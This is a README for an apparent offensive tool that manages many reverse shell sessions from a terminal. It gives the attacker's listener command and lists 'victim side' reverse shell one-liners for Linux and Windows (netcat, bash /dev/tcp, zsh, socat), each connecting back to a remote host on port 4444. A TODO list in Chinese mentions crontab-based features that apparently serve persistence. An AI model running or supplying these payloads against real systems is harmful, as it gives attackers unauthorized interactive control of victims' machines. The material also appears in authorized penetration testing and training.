# Reverse Shell Manager

```
A multiple reverse shell sessions/clients manager via terminal
```

#### New version is under development

* Platypus
  * More stable
  * More features
  * Upgrade common reverse shell session to full interactive seession
  * ...

#### Attacker side
```
python Reverse-Shell-Manager.py 0.0.0.0 4444
```
#### Victims sides
> Linux
```
nc -e /bin/bash 1.3.3.7 4444
bash -c 'bash -i >/dev/tcp/1.3.3.7/4444 0>&1'
zsh -c 'zmodload zsh/net/tcp && ztcp 1.3.3.7 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.3.3.7:4444  
```
> Windows
```
nc.exe -e /bin/bash 1.3.3.7 4444
```

#### Simple Example Video 

[![asciicast](https://asciinema.org/a/143640.png)](https://asciinema.org/a/143640)

#### YouTube Example
> https://youtu.be/AoS-q1MGw30  


#### TODO
- [x] 实现添加 crontab 的功能
- [x] 实现删除 crontab 的功能
- [ ] 使用异步 HTTP 库 grequests
- [ ] Master 面向对象
- [ ] 抛弃多线程 , 使用 select/epoll 来解决并发问题

#### Bugs

- [x] 主机上线但是并没有被加入列表
- [ ] socket 在 recv 的时候会出现假死的情况 (暂时不能复现)

#### LICENSE

```
THE DRINKWARE LICENSE

<wangyihanger@gmail.com> wrote this file. As long as 
you retain this notice you can do whatever you want 
with this stuff. If we meet some day, and you think 
this stuff is worth it, you can buy me the following
drink(s) in return.

Red Bull
JDB
Coffee
Sprite
Cola
Harbin Beer
etc

Wang Yihang
```
